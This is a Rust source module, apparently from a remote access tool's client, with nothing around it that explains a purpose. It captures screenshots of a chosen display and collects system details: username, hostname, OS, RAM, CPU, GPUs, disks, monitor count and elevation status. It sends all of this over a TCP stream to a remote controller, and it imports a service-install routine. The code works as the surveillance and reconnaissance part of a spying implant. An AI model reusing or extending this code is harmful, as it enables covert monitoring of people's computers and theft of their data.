use std::net::TcpStream;
use screenshots::{image, Screen};
use std::io::Cursor;

use sysinfo::{System, Disks};

use winapi::shared::winerror::{S_OK, DXGI_ERROR_NOT_FOUND};
use winapi::shared::dxgi::{CreateDXGIFactory, IDXGIFactory};
use winapi::shared::dxgi::IDXGIAdapter;
use winapi::Interface;

use winapi::um::winuser::EnumDisplayMonitors;
use winapi::shared::windef::{HMONITOR, HDC, RECT};
use winapi::shared::minwindef::{BOOL, LPARAM};
use std::ptr;

use crate::service::install::is_elevated;

use common::buffers::write_bytes;

pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
    println!("taking the mf screenshot");
        
    let screens = Screen::all().unwrap();

    let screen = screens[display as usize];

    let image = screen.capture().unwrap();

    let mut bytes: Vec<u8> = Vec::new();

    image
        .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Png)
        .expect("Couldn't write image to bytes.");

    let header = "screenshot||".to_string();

    write_bytes(write_stream, &[header.as_bytes(), &bytes].concat());
}

pub fn client_info(write_stream: &mut TcpStream) {
    let mut s = System::new_all();

    let hostname = System::host_name().unwrap().to_string();
    let username = std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string());
    let os = format!("{} {}", System::name().unwrap(), System::os_version().unwrap());
    let ram: String = convert_bytes(s.total_memory() as f64);

    let mut storage = Vec::new();

    let disks = Disks::new_with_refreshed_list();
    for disk in disks.list() {
        storage.push(format!("{} {} {}", disk.name().to_string_lossy(), convert_bytes(disk.available_space() as f64), disk.kind()));
    }
    

    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
    s.refresh_cpu();

    let cpu = s.cpus()[0].brand().to_string();

    let mut gpus = Vec::new();

    unsafe {
        let mut factory: *mut IDXGIFactory = std::ptr::null_mut();
        let hr = CreateDXGIFactory(&IDXGIFactory::uuidof(), &mut factory as *mut _ as *mut _);

        if hr != S_OK {
            eprintln!("Failed to create DXGI Factory");
            return;
        }

        let mut i = 0;
        loop {
            let mut adapter: *mut IDXGIAdapter = std::ptr::null_mut();
            if (*factory).EnumAdapters(i, &mut adapter) == DXGI_ERROR_NOT_FOUND {
                break;
            }

            let mut desc = std::mem::zeroed();
            (*adapter).GetDesc(&mut desc);

            let adapter_description = String::from_utf16_lossy(&desc.Description);

            gpus.push(adapter_description.trim_end_matches(char::from(0)).to_string());

            i += 1;
        }
    }

    let mut display_count = 0;
    unsafe {
        EnumDisplayMonitors(
            ptr::null_mut(),
            ptr::null_mut(),
            Some(monitor_enum_proc),
            &mut display_count as *mut _ as LPARAM,
        );
    }

    let is_elevated = is_elevated();

    let response = format!("receive::{}::{}::{}::{}::{}::{}::{}::{}::{}", username, hostname, os, ram, cpu, gpus.join(","), storage.join(","), display_count, is_elevated);
    write_bytes(write_stream, response.as_bytes());
}

const SUFFIX: [& str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];

pub fn convert_bytes<T: Into<f64>>(size: T) -> String {
    let size = size.into();

    if size <= 0.0 {
        return "0 B".to_string();
    }

    let base = size.log10() / 1024_f64.log10();

    let mut result = ((1024_f64.powf(base - base.floor()) * 10.0).round() / 10.0).to_string();

    result.push(' ');
    result.push_str(SUFFIX[base.floor() as usize]);

    result
}

unsafe extern "system" fn monitor_enum_proc(
    _h_monitor: HMONITOR,
    _hdc_monitor: HDC,
    _lprc_monitor: *mut RECT,
    lparam: LPARAM,
) -> BOOL {
    let count = &mut *(lparam as *mut usize);
    *count += 1;
    1
}